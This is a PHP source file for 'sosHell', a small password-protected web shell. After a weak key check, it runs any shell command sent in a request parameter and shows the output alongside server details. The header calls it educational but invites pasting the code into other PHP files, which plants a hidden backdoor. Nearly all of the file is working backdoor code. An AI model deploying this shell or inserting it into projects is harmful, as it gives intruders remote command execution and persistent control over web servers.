<?php
/*======================================================================
 * Alexander Sosna {alexander (at) xxor (dot) de}
 * Find more stuff: http://xxor.de or https://github.com/xxorde
 * The folloing code is for education and demonstration only!
 * Read it to understand why!
 *
 * This code is licensed to you under the terms of the GNU General
 * Public License, version 2.0. 
 * See GPL2 file for the text of the licenses!
 * http://www.gnu.org/licenses/gpl-2.0.txt
 * You want any other licence? Mail me, I am a nice person :D
 *
 *
 * Usage: http://127.0.0.1/sosHell.php?key=password
 * 
 * You can also include the folloing code in your favorite php file!
 * Set $sosHellKey to the sha1 of your password!
======================================================================*/

//Set password!
$sosHellKey = sha1("password"); 

$style="position:fixed;width:100%;font-family:monospace;color:#609;font-size:120%;";
$styleWin="top:0px; left:0px;height:100%;overflow:scroll;background:black;";
$styleCmd="bottom:0px;border:none;background:#111;";

if(isset($_REQUEST["key"]) && (sha1($_REQUEST["key"])==$sosHellKey)){ 
	echo("<div style='".$style.$styleWin."'>");
	echo("sosHell 0.0.1 => ".$_SERVER['REMOTE_ADDR']."@"
		.$_SERVER['SERVER_NAME']." (".$_SERVER['SERVER_SOFTWARE'].
		") serving: ".$_SERVER['DOCUMENT_ROOT']);
	if(isset($_REQUEST["cmd"]) && $_REQUEST["cmd"]){
		$cmd=$_REQUEST["cmd"];		
		exec($cmd,$ausgabe);
		echo(" command: ".$cmd."<br><br>");
		foreach($ausgabe as $line){
			flush(); ob_flush();
			echo(utf8_decode($line)."<br>");
		}
	}
	echo("<form method='post'><input name='key' type='hidden' value='".
		$_REQUEST["key"]."'></input><input style='".$style.$styleCmd.
		"' name='cmd' type='text' autofocus></form><br></div>");
}
?>
